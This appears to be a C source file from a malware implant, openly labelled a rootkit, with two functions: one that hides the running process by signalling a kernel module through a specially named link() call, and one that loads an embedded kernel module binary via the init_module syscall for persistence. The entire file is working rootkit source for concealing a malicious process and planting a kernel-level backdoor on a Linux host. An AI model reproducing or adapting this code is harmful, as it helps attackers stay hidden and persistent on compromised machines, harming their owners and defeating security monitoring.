#include "rootkit.h"
#include "rootkit_bin.h"
#include "utils.h"

#define __NR_init_module 175

void try_hide(Globals *glob) {
  global = glob;

  if (global->geteuid() != 0) {
    DEBUG_LOG("[Rootkit] Not running as root\n");
    return;
  }

  global->sleep(2);
  DEBUG_LOG("[Rootkit] Hiding process\n");

  int pid = global->getpid();
  char pid_str[255];

  global->sprintf(pid_str, "%d", pid);

  global->link("h|ide", pid_str);
}

void try_persist(Globals *glob) {
  global = glob;

  DEBUG_LOG("[Rootkit] Trying to rookit!\n");
  if (global->geteuid() != 0) {
    DEBUG_LOG("[Rootkit] Not running as root\n");
    return;
  }

  DEBUG_LOG("[Rootkit] Loading kernel module\n");

  if (global->syscall(__NR_init_module, ROOTKIT_BIN,
                      sizeof(ROOTKIT_BIN) / sizeof(ROOTKIT_BIN[0]), "") == -1) {
    DEBUG_LOG("[Rootkit] Failed to load module\n");
  }
}
